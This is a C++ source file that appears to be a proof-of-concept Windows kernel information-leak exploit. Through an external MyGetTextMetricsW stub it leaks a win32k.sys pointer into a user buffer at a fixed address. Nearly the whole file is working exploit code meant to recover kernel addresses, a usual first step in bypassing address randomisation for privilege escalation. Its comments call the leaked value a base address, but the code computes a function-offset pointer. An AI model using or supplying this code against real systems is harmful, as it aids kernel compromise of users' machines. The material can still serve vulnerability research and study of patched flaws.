// InfoLeak.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>

#define INFOLEAK_BUFFER 0x40000000

extern "C" VOID MyGetTextMetricsW(HDC, LPTEXTMETRICW, DWORD);

// Leak the base address of `win32k.sys`.
ULONGLONG win32k_infoleak() {
	ULONGLONG win32k_addr = 0;
	HDC hdc;

	hdc = CreateCompatibleDC(NULL);
	if (hdc == NULL) {
		return NULL;
	}

	// Leak the address and retrieve it from `buffer`.
	MyGetTextMetricsW(hdc, (LPTEXTMETRICW)INFOLEAK_BUFFER, 0x44);

	DWORD hi = *(DWORD *)(INFOLEAK_BUFFER + 0x3c);
	DWORD lo = *(DWORD *)(INFOLEAK_BUFFER + 0x38);

	// Check: High DWORD should be a kernel-mode address (i.e.
	// 0xffff0800`00000000). We make the check stricter by checking for a
	// subset of kernel-mode addresses.
	if ((hi & 0xfffff000) != 0xfffff000) {
		return NULL;
	}

	// Retrieve the address of `win32k!RGNOBJ::UpdateUserRgn+0x70` using
	// the following computation.
	win32k_addr = ((ULONGLONG)hi << 32) | lo;

	printf("DeleteDC\n");
	DeleteDC(hdc);
	return win32k_addr;
}

int _tmain(int argc, _TCHAR* argv[])
{
	ULONGLONG win32k_addr;

	VirtualAlloc((LPVOID)INFOLEAK_BUFFER, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Leak the base address.
	win32k_addr = win32k_infoleak();
	if (win32k_addr == NULL) {
		printf("[!] No win32k leaked\n");
		return -1;
	}
	else {
		printf("[*] It looks like a kernel address, check if it's in the win32k.sys range\n");
		printf("[*] Leak: %llx\n", win32k_addr);
	}

	return 0;
}